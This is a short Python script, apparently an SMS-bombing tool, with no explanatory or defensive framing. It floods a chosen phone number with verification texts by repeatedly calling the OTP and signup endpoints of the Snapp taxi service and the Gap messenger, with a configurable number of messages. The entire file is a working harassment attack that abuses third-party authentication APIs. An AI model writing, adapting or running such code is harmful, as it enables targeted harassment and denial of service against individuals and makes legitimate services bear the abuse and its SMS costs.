# Not using tor

import requests

# Change these values to your target phone number and the number of SMS to send
target_phone_number = '+1234567890'
number_of_sms_to_send = 10

# API URLs
snapp_api_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
gap_api_url = 'https://core.gap.im/v1/user/add.json?mobile=%2B{}'


# Payloads for the APIs
snapp_payload = {'cellphone': target_phone_number}
gap_payload = {}

# Headers for the APIs
headers = {'Content-Type': 'application/json'}

# Send SMS using Snapp API
for i in range(number_of_sms_to_send):
    response = requests.post(snapp_api_url, headers=headers, json=snapp_payload)
    print(f'Snapp SMS {i+1} sent with response code {response.status_code}')

# Send SMS using GAP API
for i in range(number_of_sms_to_send):
    response = requests.post(gap_api_url.format(target_phone_number), headers=headers, json=gap_payload)
    print(f'GAP SMS {i+1} sent with response code {response.status_code}')
